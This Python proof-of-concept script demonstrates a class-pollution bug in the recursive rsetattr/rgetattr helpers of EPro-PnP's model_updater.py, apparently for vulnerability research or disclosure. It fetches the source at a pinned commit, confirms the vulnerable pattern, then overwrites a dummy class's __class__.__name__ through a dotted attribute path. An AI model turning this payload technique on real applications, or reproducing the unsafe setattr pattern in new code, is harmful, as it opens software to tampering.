# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: rsetattr
# Type: get-attr-set-attr
# Source: EPro-PnP-Det/epropnp_det/runner/hooks/model_updater.py
#
# EPro-PnP requires mmcv/mmdet C extensions that prevent pip install.
# We download the vulnerable source file, verify the code matches,
# then reproduce the vulnerable functions to demonstrate the bug.

import functools
import os
import subprocess

REPO_COMMIT = "21269649033c464c2c9d829ee9bad09ef6839320"
SOURCE_URL = f"https://raw.githubusercontent.com/tjiiv-cprg/EPro-PnP/{REPO_COMMIT}/EPro-PnP-Det/epropnp_det/runner/hooks/model_updater.py"
LOCAL_FILE = os.path.join(os.path.dirname(__file__), "model_updater.py")

# Download source if not cached
if not os.path.exists(LOCAL_FILE):
    subprocess.run(["curl", "-sS", SOURCE_URL, "-o", LOCAL_FILE], check=True)

with open(LOCAL_FILE, "r") as f:
    source = f.read()

# Verify vulnerable pattern exists in source
assert "def rsetattr(obj, attr, val):" in source
assert "def rgetattr(obj, attr, *args):" in source
assert "functools.reduce(_getattr, [obj] + attr.split('.'))" in source
print(f"[*] Verified vulnerable rsetattr/rgetattr at commit {REPO_COMMIT[:12]}")


# Reproduce the exact vulnerable functions from source
def rgetattr(obj, attr, *args):
    def _getattr(obj, attr):
        return getattr(obj, attr, *args)
    return functools.reduce(_getattr, [obj] + attr.split('.'))

def rsetattr(obj, attr, val):
    pre, _, post = attr.rpartition('.')
    return setattr(rgetattr(obj, pre) if pre else obj, post, val)


class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  rsetattr(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
